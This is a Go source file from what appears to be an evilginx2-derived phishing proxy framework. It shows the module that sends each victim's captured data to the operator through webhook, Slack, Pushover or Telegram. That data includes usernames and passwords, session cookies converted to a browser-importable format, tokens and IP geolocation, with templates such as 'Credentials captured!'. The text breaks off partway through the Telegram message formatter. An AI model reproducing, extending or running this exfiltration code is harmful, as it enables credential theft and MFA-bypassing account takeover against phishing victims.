package core

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// Event types
const (
	EventLureClicked         = "lure_clicked"
	EventLureLanded          = "lure_landed"
	EventCredentialCaptured  = "credential_captured"
	EventSessionCaptured     = "session_captured"
	EventDeviceCodeCaptured  = "devicecode_captured"
	EventDeviceCodeGenerated = "devicecode_generated"
)

// Channel types
const (
	ChannelWebhook  = "webhook"
	ChannelSlack    = "slack"
	ChannelPushover = "pushover"
	ChannelTelegram = "telegram"
)

var AllEventTypes = []string{EventLureClicked, EventLureLanded, EventCredentialCaptured, EventSessionCaptured, EventDeviceCodeCaptured, EventDeviceCodeGenerated}
var AllChannelTypes = []string{ChannelWebhook, ChannelSlack, ChannelPushover, ChannelTelegram}

// GeoInfo holds IP geolocation information
type GeoInfo struct {
	City        string
	Region      string
	Country     string
	CountryFlag string
	ISP         string
}

// getIPGeoInfo fetches geolocation info for an IP address
func getIPGeoInfo(ip string) *GeoInfo {
	geo := &GeoInfo{
		City:        "Unknown",
		Region:      "Unknown",
		Country:     "Unknown",
		CountryFlag: "🌍",
		ISP:         "Unknown",
	}

	// Use ip-api.com (free, no API key required)
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,countryCode,regionName,city,isp", ip))
	if err != nil {
		return geo
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return geo
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return geo
	}

	if status, ok := result["status"].(string); ok && status == "success" {
		if city, ok := result["city"].(string); ok && city != "" {
			geo.City = city
		}
		if region, ok := result["regionName"].(string); ok && region != "" {
			geo.Region = region
		}
		if country, ok := result["country"].(string); ok && country != "" {
			geo.Country = country
		}
		if countryCode, ok := result["countryCode"].(string); ok && countryCode != "" {
			geo.CountryFlag = getCountryFlag(countryCode)
		}
		if isp, ok := result["isp"].(string); ok && isp != "" {
			geo.ISP = isp
		}
	}

	return geo
}

// getCountryFlag converts country code to flag emoji
func getCountryFlag(countryCode string) string {
	if len(countryCode) != 2 {
		return "🌍"
	}
	countryCode = strings.ToUpper(countryCode)
	// Convert country code to regional indicator symbols
	flag := ""
	for _, c := range countryCode {
		flag += string(rune(0x1F1E6 + c - 'A'))
	}
	return flag
}

// extractEmailFromIDToken extracts email from a JWT ID token
func extractEmailFromIDToken(idToken string) string {
	parts := strings.Split(idToken, ".")
	if len(parts) != 3 {
		return ""
	}
	
	// Decode the payload (second part)
	payload := parts[1]
	// Add padding if needed
	switch len(payload) % 4 {
	case 2:
		payload += "=="
	case 3:
		payload += "="
	}
	
	decoded, err := base64.URLEncoding.DecodeString(payload)
	if err != nil {
		// Try without padding
		decoded, err = base64.RawURLEncoding.DecodeString(parts[1])
		if err != nil {
			return ""
		}
	}
	
	var claims map[string]interface{}
	if err := json.Unmarshal(decoded, &claims); err != nil {
		return ""
	}
	
	// Try different claim names for email
	if email, ok := claims["email"].(string); ok && email != "" {
		return email
	}
	if upn, ok := claims["upn"].(string); ok && upn != "" {
		return upn
	}
	if preferred, ok := claims["preferred_username"].(string); ok && preferred != "" {
		return preferred
	}
	
	return ""
}

// NotifierEventTemplate holds template strings for notification messages
type NotifierEventTemplate struct {
	Subject string `mapstructure:"subject" json:"subject" yaml:"subject"`
	Body    string `mapstructure:"body" json:"body" yaml:"body"`
}

// NotifierConfig holds configuration for a single notifier
type NotifierConfig struct {
	Name    string `mapstructure:"name" json:"name" yaml:"name"`
	Channel string `mapstructure:"channel" json:"channel" yaml:"channel"` // webhook, slack, pushover, telegram
	Enabled bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`

	// Channel-specific configuration
	WebhookURL      string `mapstructure:"webhook_url" json:"webhook_url" yaml:"webhook_url"`
	WebhookToken    string `mapstructure:"webhook_token" json:"webhook_token" yaml:"webhook_token"`
	WebhookInsecure bool   `mapstructure:"webhook_insecure" json:"webhook_insecure" yaml:"webhook_insecure"`

	SlackOAuthToken string `mapstructure:"slack_oauth_token" json:"slack_oauth_token" yaml:"slack_oauth_token"`
	SlackChannelID  string `mapstructure:"slack_channel_id" json:"slack_channel_id" yaml:"slack_channel_id"`

	PushoverUserKey  string `mapstructure:"pushover_user_key" json:"pushover_user_key" yaml:"pushover_user_key"`
	PushoverAPIToken string `mapstructure:"pushover_api_token" json:"pushover_api_token" yaml:"pushover_api_token"`
	PushoverSound    string `mapstructure:"pushover_sound" json:"pushover_sound" yaml:"pushover_sound"`

	TelegramBotToken string `mapstructure:"telegram_bot_token" json:"telegram_bot_token" yaml:"telegram_bot_token"`
	TelegramChatID   string `mapstructure:"telegram_chat_id" json:"telegram_chat_id" yaml:"telegram_chat_id"`

	// Event triggers - which events should trigger notifications
	Triggers map[string]bool `mapstructure:"triggers" json:"triggers" yaml:"triggers"`

	// Event templates - customizable message templates
	Templates map[string]*NotifierEventTemplate `mapstructure:"templates" json:"templates" yaml:"templates"`
}

// DefaultNotifierConfig holds default settings for new notifiers
type DefaultNotifierConfig struct {
	Triggers  map[string]bool                   `mapstructure:"triggers" json:"triggers" yaml:"triggers"`
	Templates map[string]*NotifierEventTemplate `mapstructure:"templates" json:"templates" yaml:"templates"`
}

// pendingCredKey uniquely identifies a pending credential notification
type pendingCredKey struct {
	origin   string
	phishlet string
}

// NotifierManager manages all notifiers
type NotifierManager struct {
	notifiers          map[string]*NotifierConfig
	defaults           *DefaultNotifierConfig
	serverName         string
	mu                 sync.RWMutex
	pendingCredentials map[pendingCredKey]chan struct{}
	pendMu             sync.Mutex
}

// NewNotifierManager creates a new notifier manager
func NewNotifierManager() *NotifierManager {
	nm := &NotifierManager{
		notifiers:          make(map[string]*NotifierConfig),
		serverName:         "evilginx",
		defaults:           getDefaultNotifierConfig(),
		pendingCredentials: make(map[pendingCredKey]chan struct{}),
	}
	return nm
}

func getDefaultNotifierConfig() *DefaultNotifierConfig {
	return &DefaultNotifierConfig{
		Triggers: map[string]bool{
			EventLureClicked:         false,
			EventLureLanded:          false,
			EventCredentialCaptured:  true,
			EventSessionCaptured:     true,
			EventDeviceCodeCaptured:  true,
			EventDeviceCodeGenerated: false,
		},
		Templates: map[string]*NotifierEventTemplate{
			EventLureClicked: {
				Subject: "[{server}] Lure clicked",
				Body:    "Visitor from `{origin}` clicked lure URL: {lure_url}",
			},
			EventLureLanded: {
				Subject: "[{server}] Visitor landed on phishing page",
				Body:    "Visitor from `{origin}` passed Botguard and landed on phishing page\nLure: {lure_url}\nPhishlet: {phishlet}",
			},
			EventCredentialCaptured: {
				Subject: "[{server}] Credentials captured!",
				Body:    "Credentials captured for session #{session_id}\nUsername: {credential:username}\nPassword: {credential:password}\nOrigin: {origin}",
			},
			EventSessionCaptured: {
				Subject: "[{server}] Session tokens captured!",
				Body:    "Full session captured for #{session_id}!\nPhishlet: {phishlet}\nUsername: {credential:username}\nOrigin: {origin}\nUser-Agent: {useragent}",
			},
			EventDeviceCodeCaptured: {
				Subject: "[{server}] Device code tokens captured!",
				Body:    "Device code flow completed for #{session_id}!\nPhishlet: {phishlet}\nOrigin: {origin}",
			},
			EventDeviceCodeGenerated: {
				Subject: "[{server}] Device code generated",
				Body:    "New device code generated for #{session_id}\nPhishlet: {phishlet}\nOrigin: {origin}",
			},
		},
	}
}

// SetServerName sets the server name for notifications
func (nm *NotifierManager) SetServerName(name string) {
	nm.mu.Lock()
	defer nm.mu.Unlock()
	nm.serverName = name
}

// GetServerName returns the server name
func (nm *NotifierManager) GetServerName() string {
	nm.mu.RLock()
	defer nm.mu.RUnlock()
	return nm.serverName
}

// CreateNotifier creates a new notifier
func (nm *NotifierManager) CreateNotifier(name string) (*NotifierConfig, error) {
	nm.mu.Lock()
	defer nm.mu.Unlock()

	if _, exists := nm.notifiers[name]; exists {
		return nil, fmt.Errorf("notifier '%s' already exists", name)
	}

	// Copy default triggers
	triggers := make(map[string]bool)
	for k, v := range nm.defaults.Triggers {
		triggers[k] = v
	}

	// Copy default templates
	templates := make(map[string]*NotifierEventTemplate)
	for k, v := range nm.defaults.Templates {
		templates[k] = &NotifierEventTemplate{
			Subject: v.Subject,
			Body:    v.Body,
		}
	}

	notifier := &NotifierConfig{
		Name:      name,
		Channel:   "",
		Enabled:   true,
		Triggers:  triggers,
		Templates: templates,
	}

	nm.notifiers[name] = notifier
	log.Info("created notifier: %s", name)
	return notifier, nil
}

// DeleteNotifier deletes a notifier
func (nm *NotifierManager) DeleteNotifier(name string) error {
	nm.mu.Lock()
	defer nm.mu.Unlock()

	if _, exists := nm.notifiers[name]; !exists {
		return fmt.Errorf("notifier '%s' not found", name)
	}

	delete(nm.notifiers, name)
	log.Info("deleted notifier: %s", name)
	return nil
}

// GetNotifier returns a notifier by name
func (nm *NotifierManager) GetNotifier(name string) *NotifierConfig {
	nm.mu.RLock()
	defer nm.mu.RUnlock()
	return nm.notifiers[name]
}

// ListNotifiers returns all notifiers
func (nm *NotifierManager) ListNotifiers() []*NotifierConfig {
	nm.mu.RLock()
	defer nm.mu.RUnlock()

	var notifiers []*NotifierConfig
	for _, n := range nm.notifiers {
		notifiers = append(notifiers, n)
	}
	return notifiers
}

// EnableNotifier enables or disables a notifier
func (nm *NotifierManager) EnableNotifier(name string, enabled bool) error {
	nm.mu.Lock()
	defer nm.mu.Unlock()

	n, exists := nm.notifiers[name]
	if !exists {
		return fmt.Errorf("notifier '%s' not found", name)
	}

	n.Enabled = enabled
	return nil
}

// SetTrigger enables or disables a trigger for a notifier
func (nm *NotifierManager) SetTrigger(name string, event string, enabled bool) error {
	nm.mu.Lock()
	defer nm.mu.Unlock()

	n, exists := nm.notifiers[name]
	if !exists {
		return fmt.Errorf("notifier '%s' not found", name)
	}

	if !stringExists(event, AllEventTypes) {
		return fmt.Errorf("invalid event type: %s", event)
	}

	n.Triggers[event] = enabled
	return nil
}

// SetTemplate sets the template for an event
func (nm *NotifierManager) SetTemplate(name string, event string, subject string, body string) error {
	nm.mu.Lock()
	defer nm.mu.Unlock()

	n, exists := nm.notifiers[name]
	if !exists {
		return fmt.Errorf("notifier '%s' not found", name)
	}

	if !stringExists(event, AllEventTypes) {
		return fmt.Errorf("invalid event type: %s", event)
	}

	if n.Templates == nil {
		n.Templates = make(map[string]*NotifierEventTemplate)
	}

	if n.Templates[event] == nil {
		n.Templates[event] = &NotifierEventTemplate{}
	}

	if subject != "" {
		n.Templates[event].Subject = subject
	}
	if body != "" {
		n.Templates[event].Body = body
	}

	return nil
}

// SetDefaultTrigger sets the default trigger for new notifiers
func (nm *NotifierManager) SetDefaultTrigger(event string, enabled bool) error {
	nm.mu.Lock()
	defer nm.mu.Unlock()

	if !stringExists(event, AllEventTypes) {
		return fmt.Errorf("invalid event type: %s", event)
	}

	nm.defaults.Triggers[event] = enabled
	return nil
}

// SetDefaultTemplate sets the default template for new notifiers
func (nm *NotifierManager) SetDefaultTemplate(event string, subject string, body string) error {
	nm.mu.Lock()
	defer nm.mu.Unlock()

	if !stringExists(event, AllEventTypes) {
		return fmt.Errorf("invalid event type: %s", event)
	}

	if nm.defaults.Templates[event] == nil {
		nm.defaults.Templates[event] = &NotifierEventTemplate{}
	}

	if subject != "" {
		nm.defaults.Templates[event].Subject = subject
	}
	if body != "" {
		nm.defaults.Templates[event].Body = body
	}

	return nil
}

// ResetDefaults resets default settings to factory defaults
func (nm *NotifierManager) ResetDefaults() {
	nm.mu.Lock()
	defer nm.mu.Unlock()
	nm.defaults = getDefaultNotifierConfig()
}

// ResetNotifier resets a notifier to default settings
func (nm *NotifierManager) ResetNotifier(name string) error {
	nm.mu.Lock()
	defer nm.mu.Unlock()

	n, exists := nm.notifiers[name]
	if !exists {
		return fmt.Errorf("notifier '%s' not found", name)
	}

	// Copy default triggers
	n.Triggers = make(map[string]bool)
	for k, v := range nm.defaults.Triggers {
		n.Triggers[k] = v
	}

	// Copy default templates
	n.Templates = make(map[string]*NotifierEventTemplate)
	for k, v := range nm.defaults.Templates {
		n.Templates[k] = &NotifierEventTemplate{
			Subject: v.Subject,
			Body:    v.Body,
		}
	}

	return nil
}

// GetDefaults returns the default configuration
func (nm *NotifierManager) GetDefaults() *DefaultNotifierConfig {
	nm.mu.RLock()
	defer nm.mu.RUnlock()
	return nm.defaults
}

// LoadNotifiers loads notifiers from configuration
func (nm *NotifierManager) LoadNotifiers(notifiers []*NotifierConfig, defaults *DefaultNotifierConfig) {
	nm.mu.Lock()
	defer nm.mu.Unlock()

	nm.notifiers = make(map[string]*NotifierConfig)
	for _, n := range notifiers {
		// Force-disable lure events
		n.Triggers[EventLureClicked] = false
		n.Triggers[EventLureLanded] = false
		nm.notifiers[n.Name] = n
	}

	if defaults != nil {
		nm.defaults = defaults
	}
}

// ExportNotifiers exports notifiers for saving to config
func (nm *NotifierManager) ExportNotifiers() ([]*NotifierConfig, *DefaultNotifierConfig) {
	nm.mu.RLock()
	defer nm.mu.RUnlock()

	var notifiers []*NotifierConfig
	for _, n := range nm.notifiers {
		notifiers = append(notifiers, n)
	}

	return notifiers, nm.defaults
}

// ============================================================================
// Event Data Structures for Webhook
// ============================================================================

// WebhookLure represents lure data in webhook payload
type WebhookLure struct {
	ID  int    `json:"id"`
	URL string `json:"url"`
}

// WebhookCookie represents a cookie in the webhook payload (Chromium format)
type WebhookCookie struct {
	Domain         string `json:"domain"`
	ExpirationDate int64  `json:"expirationDate"`
	HostOnly       bool   `json:"hostOnly"`
	HttpOnly       bool   `json:"httpOnly"`
	Name           string `json:"name"`
	Path           string `json:"path"`
	Secure         bool   `json:"secure"`
	Session        bool   `json:"session"`
	Value          string `json:"value"`
}

// WebhookSession represents session data in webhook payload
type WebhookSession struct {
	ID           int               `json:"id"`
	UUID         string            `json:"uuid"`
	CreatedAt    string            `json:"created_at"`
	Params       map[string]string `json:"params"`
	UserAgent    string            `json:"useragent"`
	Cookies      []*WebhookCookie  `json:"cookies"`
	Credentials  map[string]string `json:"credentials"`
	CustomTokens map[string]string `json:"custom_tokens"`
	HttpTokens   map[string]string `json:"http_tokens"`
	BodyTokens   map[string]string `json:"body_tokens"`
}

// WebhookPayload represents the full webhook payload
type WebhookPayload struct {
	ServerName string          `json:"server_name"`
	Event      string          `json:"event"`
	Lure       *WebhookLure    `json:"lure"`
	Origin     string          `json:"origin"`
	Phishlet   string          `json:"phishlet"`
	Session    *WebhookSession `json:"session"`
}

// NotificationData is a simple struct for triggering notifications from HTTP proxy
type NotificationData struct {
	Origin    string
	LureURL   string
	Phishlet  string
	SessionID string
	UserAgent string
	Username  string
	Password  string
	Custom    map[string]string
	Session   *Session // optional, for full session data
}

// EventData holds all data for an event notification
type EventData struct {
	Event       string
	Origin      string
	LureID      int
	LureURL     string
	Phishlet    string
	SessionID   int
	SessionUUID string
	CreatedAt   time.Time
	Params      map[string]string
	UserAgent   string
	Cookies     map[string]map[string]*database.CookieToken
	Credentials map[string]string
	Custom      map[string]string
	HttpTokens  map[string]string
	BodyTokens  map[string]string
}

// ============================================================================
// Notification Sending
// ============================================================================

// Trigger is a convenient method for triggering notifications from HTTP proxy
func (nm *NotifierManager) Trigger(event string, data *NotificationData) {
	if data == nil {
		return
	}

	eventData := &EventData{
		Event:       event,
		Origin:      data.Origin,
		LureURL:     data.LureURL,
		Phishlet:    data.Phishlet,
		SessionUUID: data.SessionID,
		UserAgent:   data.UserAgent,
		Custom:      data.Custom,
		CreatedAt:   time.Now(),
	}

	// Build credentials map
	creds := make(map[string]string)
	if data.Username != "" {
		creds["username"] = data.Username
	}
	if data.Password != "" {
		creds["password"] = data.Password
	}
	eventData.Credentials = creds

	// If we have a full session, extract additional data
	if data.Session != nil {
		eventData.Params = data.Session.Params
		eventData.Cookies = data.Session.CookieTokens
		eventData.HttpTokens = data.Session.HttpTokens
		eventData.BodyTokens = data.Session.BodyTokens
		if eventData.Custom == nil {
			eventData.Custom = data.Session.Custom
		}
	}

	nm.Notify(event, eventData)
}

// Notify sends notifications for an event to all enabled notifiers
func (nm *NotifierManager) Notify(event string, data *EventData) {
	nm.mu.RLock()
	notifiers := make([]*NotifierConfig, 0, len(nm.notifiers))
	for _, n := range nm.notifiers {
		notifiers = append(notifiers, n)
	}
	serverName := nm.serverName
	nm.mu.RUnlock()

	for _, n := range notifiers {
		if !n.Enabled {
			continue
		}

		// Check if this event should trigger notification
		if enabled, ok := n.Triggers[event]; !ok || !enabled {
			continue
		}

		go func(notifier *NotifierConfig) {
			var err error
			switch notifier.Channel {
			case ChannelWebhook:
				err = nm.sendWebhook(notifier, event, data, serverName)
			case ChannelSlack:
				err = nm.sendSlack(notifier, event, data, serverName)
			case ChannelPushover:
				err = nm.sendPushover(notifier, event, data, serverName)
			case ChannelTelegram:
				err = nm.sendTelegram(notifier, event, data, serverName)
			default:
				log.Warning("notifier '%s' has no channel configured", notifier.Name)
				return
			}
			if err != nil {
				log.Error("notifier '%s' failed to send %s notification: %v", notifier.Name, notifier.Channel, err)
			} else {
				log.Debug("notifier '%s' sent %s notification for event: %s", notifier.Name, notifier.Channel, event)
			}
		}(n)
	}
}

// Test sends a test notification
func (nm *NotifierManager) Test(notifierName string, event string) error {
	nm.mu.RLock()
	n := nm.notifiers[notifierName]
	serverName := nm.serverName
	nm.mu.RUnlock()

	if n == nil {
		return fmt.Errorf("notifier '%s' not found", notifierName)
	}

	if n.Channel == "" {
		return fmt.Errorf("notifier '%s' has no channel configured", notifierName)
	}

	// Create test data
	testData := &EventData{
		Event:       event,
		Origin:      "192.168.1.100",
		LureID:      1,
		LureURL:     "https://example.com/test-lure",
		Phishlet:    "test-phishlet",
		SessionID:   12345,
		SessionUUID: "test-uuid-1234-5678-9012",
		CreatedAt:   time.Now(),
		Params: map[string]string{
			"email": "test@example.com",
		},
		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Test Browser",
		Credentials: map[string]string{
			"username": "test@example.com",
			"password": "test-password",
		},
		Custom:     make(map[string]string),
		HttpTokens: make(map[string]string),
		BodyTokens: make(map[string]string),
	}

	var err error
	switch n.Channel {
	case ChannelWebhook:
		err = nm.sendWebhook(n, event, testData, serverName)
	case ChannelSlack:
		err = nm.sendSlack(n, event, testData, serverName)
	case ChannelPushover:
		err = nm.sendPushover(n, event, testData, serverName)
	case ChannelTelegram:
		err = nm.sendTelegram(n, event, testData, serverName)
	default:
		return fmt.Errorf("unknown channel: %s", n.Channel)
	}

	return err
}

// processTemplate replaces placeholders in template strings
func (nm *NotifierManager) processTemplate(template string, event string, data *EventData, serverName string) string {
	result := template

	// Basic placeholders
	result = strings.ReplaceAll(result, "{server}", serverName)
	result = strings.ReplaceAll(result, "{event}", event)
	result = strings.ReplaceAll(result, "{origin}", data.Origin)
	result = strings.ReplaceAll(result, "{lure_url}", data.LureURL)
	result = strings.ReplaceAll(result, "{phishlet}", data.Phishlet)
	result = strings.ReplaceAll(result, "{session_id}", fmt.Sprintf("%d", data.SessionID))
	result = strings.ReplaceAll(result, "{session_uuid}", data.SessionUUID)
	result = strings.ReplaceAll(result, "{useragent}", data.UserAgent)

	// Credential placeholders
	if data.Credentials != nil {
		credJSON, _ := json.Marshal(data.Credentials)
		result = strings.ReplaceAll(result, "{credentials}", string(credJSON))
		for k, v := range data.Credentials {
			result = strings.ReplaceAll(result, fmt.Sprintf("{credential:%s}", k), v)
		}
	}

	// Custom param placeholders
	if data.Params != nil {
		for k, v := range data.Params {
			result = strings.ReplaceAll(result, fmt.Sprintf("{param:%s}", k), v)
		}
	}

	// Token placeholders (JSON format)
	if data.Custom != nil {
		customJSON, _ := json.Marshal(data.Custom)
		result = strings.ReplaceAll(result, "{custom_tokens}", string(customJSON))
	}
	if data.HttpTokens != nil {
		httpJSON, _ := json.Marshal(data.HttpTokens)
		result = strings.ReplaceAll(result, "{http_tokens}", string(httpJSON))
	}
	if data.BodyTokens != nil {
		bodyJSON, _ := json.Marshal(data.BodyTokens)
		result = strings.ReplaceAll(result, "{body_tokens}", string(bodyJSON))
	}

	// Cookies placeholder (JSON format)
	if data.Cookies != nil {
		cookies := convertCookiesToWebhookFormat(data.Cookies)
		cookiesJSON, _ := json.Marshal(cookies)
		result = strings.ReplaceAll(result, "{cookies}", string(cookiesJSON))
	}

	return result
}

// convertCookiesToWebhookFormat converts internal cookie format to webhook format
func convertCookiesToWebhookFormat(cookieTokens map[string]map[string]*database.CookieToken) []*WebhookCookie {
	var cookies []*WebhookCookie
	for domain, tmap := range cookieTokens {
		for name, token := range tmap {
			c := &WebhookCookie{
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Name:           name,
				Value:          token.Value,
				Path:           token.Path,
				HttpOnly:       token.HttpOnly,
				Secure:         false,
				Session:        false,
			}
			if c.Path == "" {
				c.Path = "/"
			}
			if strings.HasPrefix(name, "__Host-") || strings.HasPrefix(name, "__Secure-") {
				c.Secure = true
			}
			if strings.HasPrefix(domain, ".") {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			cookies = append(cookies, c)
		}
	}
	return cookies
}

// sendWebhook sends a webhook notification
func (nm *NotifierManager) sendWebhook(n *NotifierConfig, event string, data *EventData, serverName string) error {
	if n.WebhookURL == "" {
		return fmt.Errorf("webhook URL not configured")
	}

	// Build webhook payload
	payload := &WebhookPayload{
		ServerName: serverName,
		Event:      event,
		Lure: &WebhookLure{
			ID:  data.LureID,
			URL: data.LureURL,
		},
		Origin:   data.Origin,
		Phishlet: data.Phishlet,
		Session: &WebhookSession{
			ID:           data.SessionID,
			UUID:         data.SessionUUID,
			CreatedAt:    data.CreatedAt.Format(time.RFC3339),
			Params:       data.Params,
			UserAgent:    data.UserAgent,
			Cookies:      convertCookiesToWebhookFormat(data.Cookies),
			Credentials:  data.Credentials,
			CustomTokens: data.Custom,
			HttpTokens:   data.HttpTokens,
			BodyTokens:   data.BodyTokens,
		},
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal JSON: %v", err)
	}

	// Create HTTP client
	client := &http.Client{
		Timeout: 10 * time.Second,
	}
	if n.WebhookInsecure {
		client.Transport = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	}

	req, err := http.NewRequest("POST", n.WebhookURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}

	req.Header.Set("Content-Type", "application/json")
	if n.WebhookToken != "" {
		req.Header.Set("Authorization", "Bearer "+n.WebhookToken)
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("webhook returned status %d: %s", resp.StatusCode, string(body))
	}

	return nil
}

// sendSlack sends a Slack notification
func (nm *NotifierManager) sendSlack(n *NotifierConfig, event string, data *EventData, serverName string) error {
	if n.SlackOAuthToken == "" || n.SlackChannelID == "" {
		return fmt.Errorf("Slack oauth_token and channel_id are required")
	}

	// Get template
	template := n.Templates[event]
	if template == nil {
		template = nm.defaults.Templates[event]
	}
	if template == nil {
		return fmt.Errorf("no template found for event: %s", event)
	}

	// Process template
	text := nm.processTemplate(template.Body, event, data, serverName)

	// Build Slack payload
	payload := map[string]interface{}{
		"channel": n.SlackChannelID,
		"text":    text,
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal JSON: %v", err)
	}

	client := &http.Client{Timeout: 10 * time.Second}
	req, err := http.NewRequest("POST", "https://slack.com/api/chat.postMessage", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+n.SlackOAuthToken)

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return fmt.Errorf("failed to parse response: %v", err)
	}

	if ok, _ := result["ok"].(bool); !ok {
		errMsg, _ := result["error"].(string)
		return fmt.Errorf("Slack API error: %s", errMsg)
	}

	return nil
}

// sendPushover sends a Pushover notification
func (nm *NotifierManager) sendPushover(n *NotifierConfig, event string, data *EventData, serverName string) error {
	if n.PushoverUserKey == "" || n.PushoverAPIToken == "" {
		return fmt.Errorf("Pushover user_key and api_token are required")
	}

	// Get template
	template := n.Templates[event]
	if template == nil {
		template = nm.defaults.Templates[event]
	}
	if template == nil {
		return fmt.Errorf("no template found for event: %s", event)
	}

	// Process templates
	title := nm.processTemplate(template.Subject, event, data, serverName)
	message := nm.processTemplate(template.Body, event, data, serverName)

	// Build Pushover payload
	payload := map[string]string{
		"token":   n.PushoverAPIToken,
		"user":    n.PushoverUserKey,
		"title":   title,
		"message": message,
	}
	if n.PushoverSound != "" {
		payload["sound"] = n.PushoverSound
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal JSON: %v", err)
	}

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Post("https://api.pushover.net/1/messages.json", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("Pushover returned status %d: %s", resp.StatusCode, string(body))
	}

	return nil
}

// sendTelegram sends a Telegram notification
func (nm *NotifierManager) sendTelegram(n *NotifierConfig, event string, data *EventData, serverName string) error {
	if n.TelegramBotToken == "" || n.TelegramChatID == "" {
		return fmt.Errorf("Telegram bot_token and chat_id are required")
	}

	log.Debug("[telegram] sendTelegram called for event: %s, cookies: %d", event, len(data.Cookies))

	// Session captured: send cookie file with ✅ caption
	if event == EventSessionCaptured {
		log.Debug("[telegram] session_captured - sending cookie file")
		return nm.sendTelegramWithCookieFile(n, event, data, serverName)
	}

	// For all other events, send formatted message immediately
	return nm.sendTelegramMessage(n, event, data, serverName)
}

// parseBrowserName extracts a simple browser name from a User-Agent string
func parseBrowserName(ua string) string {
	ua = strings.ToLower(ua)
	switch {
	case strings.Contains(ua, "edg/") || strings.Contains(ua, "edge/"):
		return "Edge"
	case strings.Contains(ua, "opr/") || strings.Contains(ua, "opera"):
		return "Opera"
	case strings.Contains(ua, "brave"):
		return "Brave"
	case strings.Contains(ua, "chrome") || strings.Contains(ua, "crios"):
		return "Chrome"
	case strings.Contains(ua, "firefox") || strings.Contains(ua, "fxios"):
		return "Firefox"
	case strings.Contains(ua, "safari") && !strings.Contains(ua, "chrome"):
		return "Safari"
	default:
		return "Unknown"
	}
}

// phishletDisplayName returns a user-friendly display name for a phishlet
func phishletDisplayName(name string) string {
	switch strings.ToLower(name) {
	case "o365", "office365", "microsoft":
		return "Microsoft"
	case "google", "gmail":
		return "Google"
	case "linkedin":
		return "LinkedIn"
	case "facebook", "fb":
		return "Facebook"
	case "twitter", "x":
		return "Twitter"
	default:
		return name
	}
}

// sendTelegramMessage sends a formatted Telegram message for non-session events
func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, data *EventData, serverName string) error {
	// Get geolocation info
	geoInfo := getIPGeoInfo(data.Origin)
	browser := parseBrowserName(data.UserAgent)
	service := phishletDisplayName(data.Phishlet)

	var text string

	switch event {
	case EventLureClicked:
		text = "🔗 Lure Clicked!\n\n"
		text += fmt.Sprintf("📍 Lure URL: %s\n", data.LureURL)
		text += fmt.Sprintf("🔗 Phishlet: %s\n", data.Phishlet)
		text += fmt.Sprintf("🌐 Origin: %s\n\n", data.Origin)
		text += "📍 LOCATION INFO\n"
		text += "┌─────────────────────\n"
		text += fmt.Sprintf("│ 📌 Location: %s, %s\n", geoInfo.City, geoInfo.Region)
		text += fmt.Sprintf("│ 🌍 Country: %s %s\n", geoInfo.Country, geoInfo.CountryFlag)
		text += fmt.Sprintf("│ 🏢 ISP: %s\n", geoInfo.ISP)
		text += "└─────────────────────\n\n"
		text += fmt.Sprintf("⏰ Time: %s", time.Now().UTC().Format("2006-01-02 15:04:05 UTC"))

	case EventLureLanded:
		text = "🎣 Visitor Landed!\n\n"
		text += fmt.Sprintf("📍 Lure URL: %s\n", data.LureURL)
		text += fmt.Sprintf("🔗 Phishlet: %s\n", data.Phishlet)
		text += fmt.Sprintf("🌐 Origin: %s\n\n", data.Origin)
		text += "🖥 USER AGENT\n"
		text += fmt.Sprintf("%s\n\n", data.UserAgent)
		text += "📍 LOCATION INFO\n"
		text += "┌─────────────────────\n"
		text += fmt.Sprintf("│ 📌 Location: %s, %s\n", geoInfo.City, geoInfo.Region)
		text += fmt.Sprintf("│ 🌍 Country: %s %s\n", geoInfo.Country, geoInfo.CountryFlag)
		text += fmt.Sprintf("│ 🏢 ISP: %s\n", geoInfo.ISP)
		text += "└─────────────────────\n\n"
		text += fmt.Sprintf("⏰ Time: %s", time.Now().UTC().Format("2006-01-02 15:04:05 UTC"))

	case EventCredentialCaptured:
		username := data.Credentials["username"]
		password := data.Credentials["password"]
		text = "❌\n"
		text += fmt.Sprintf("    %s\n", service)
		text += fmt.Sprintf("    🧘:- %s\n", username)
		text += fmt.Sprintf("    🔑:- %s\n", password)
		text += fmt.Sprintf("    Browser:- %s\n", browser)
		text += fmt.Sprintf("    IP:- %s\n", data.Origin)
		text += fmt.Sprintf("    Country:- %s", geoInfo.Country)

	case EventDeviceCodeCaptured:
